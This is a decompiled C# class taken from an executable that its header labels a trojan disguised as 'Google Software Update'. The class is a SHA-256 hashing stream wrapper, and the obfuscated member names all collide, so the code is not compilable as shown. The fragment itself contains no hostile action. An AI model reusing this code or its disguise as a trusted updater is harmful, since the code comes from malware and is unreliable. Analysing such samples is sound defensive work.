// Decompiled with JetBrains decompiler
// Type: C3904355907.C1993550816
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace C3904355907
{
  public sealed class C1993550816 : Stream
  {
    private readonly Stream C3554254475;
    private readonly bool C3554254475;
    private HashAlgorithm C3554254475;
    private byte[] C3554254475 = (byte[]) null;

    [SpecialName]
    public byte[] C3554254475() => this.C3554254475;

    [SpecialName]
    public override bool get_CanRead() => !this.C3554254475;

    [SpecialName]
    public override bool get_CanSeek() => false;

    [SpecialName]
    public override bool get_CanWrite() => this.C3554254475;

    [SpecialName]
    public override long get_Length() => this.C3554254475.Length;

    [SpecialName]
    public override long get_Position() => this.C3554254475.Position;

    [SpecialName]
    public override void set_Position([In] long obj0)
    {
      Debug.Assert(false);
      throw new NotSupportedException();
    }

    public C1993550816([In] Stream obj0, [In] bool obj1, [In] HashAlgorithm obj2)
    {
      this.C3554254475 = obj0 != null ? obj0 : throw new ArgumentNullException(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cd());
      this.C3554254475 = obj1;
      this.C3554254475 = obj2 ?? (HashAlgorithm) new SHA256Managed();
      if (this.C3554254475 == null)
      {
        Debug.Assert(false);
      }
      else
      {
        if (this.C3554254475.CanReuseTransform && this.C3554254475.CanTransformMultipleBlocks)
          return;
        Debug.Assert(false);
        this.C3554254475 = (HashAlgorithm) null;
      }
    }

    protected override void Dispose([In] bool obj0)
    {
      if (obj0)
      {
        if (this.C3554254475 != null)
        {
          try
          {
            this.C3554254475.TransformFinalBlock(C3554254475.C2137352139.C3554254475, 0, 0);
            this.C3554254475 = this.C3554254475.Hash;
            this.C3554254475.Clear();
          }
          catch (Exception ex)
          {
            Debug.Assert(false);
          }
          this.C3554254475 = (HashAlgorithm) null;
        }
        this.C3554254475.Close();
      }
      base.Dispose(obj0);
    }

    public override void Flush() => this.C3554254475.Flush();

    public override long Seek([In] long obj0, [In] SeekOrigin obj1)
    {
      Debug.Assert(false);
      throw new NotSupportedException();
    }

    public override void SetLength([In] long obj0)
    {
      Debug.Assert(false);
      throw new NotSupportedException();
    }

    public override int Read([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      if (this.C3554254475)
      {
        Debug.Assert(false);
        throw new InvalidOperationException();
      }
      int inputCount = this.C3554254475.Read(obj0, obj1, obj2);
      for (int index = inputCount; inputCount < obj2 && index != 0; inputCount += index)
        index = this.C3554254475.Read(obj0, obj1 + inputCount, obj2 - inputCount);
      byte[] destinationArray = new byte[obj0.Length];
      Array.Copy((Array) obj0, (Array) destinationArray, obj0.Length);
      if (this.C3554254475 != null && inputCount > 0)
        this.C3554254475.TransformBlock(obj0, obj1, inputCount, obj0, obj1);
      Debug.Assert(C3554254475.C2137352139.C3554254475(obj0, destinationArray));
      return inputCount;
    }

    public override void Write([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
      if (!this.C3554254475)
      {
        Debug.Assert(false);
        throw new InvalidOperationException();
      }
      byte[] destinationArray = new byte[obj0.Length];
      Array.Copy((Array) obj0, (Array) destinationArray, obj0.Length);
      if (this.C3554254475 != null && obj2 > 0)
        this.C3554254475.TransformBlock(obj0, obj1, obj2, obj0, obj1);
      Debug.Assert(C3554254475.C2137352139.C3554254475(obj0, destinationArray));
      this.C3554254475.Write(obj0, obj1, obj2);
    }
  }
}
